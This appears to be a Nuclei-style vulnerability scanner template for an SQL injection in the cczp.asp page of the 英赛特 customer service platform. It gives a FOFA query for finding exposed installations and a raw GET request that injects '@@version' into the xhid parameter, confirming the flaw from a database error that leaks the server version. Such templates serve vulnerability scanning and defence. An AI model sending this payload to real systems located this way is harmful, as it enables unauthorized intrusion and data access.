id: insite-service-platform-cczp-sqli

info:
  name: 英赛特互联网客户服务平台 cczp.asp SQL注入漏洞
  author: 0dayPoc
  severity: high
  description: |-
    fofa: body="英赛特互联网客户服务平台"

    该平台中的cczp.asp组件存在SQL注入漏洞，攻击者可通过构造恶意SQL语句实现未经授权的数据访问或操作。此漏洞可能影响数据库的机密性、完整性和可用性。检测方法：通过FOFA查询语法定位目标系统，并结合日期2026-01-26进行验证。
  tags: 英赛特互联网客户服务平台

http:
- raw:
  - |
    GET /csccmise/cczp.asp?xhid=@@version HTTP/1.1
    Host: {{Hostname}}
  matchers-condition: and
  matchers:
  - type: status
    status: [500]
  - type: word
    part: body
    words:
    - 'Microsoft'
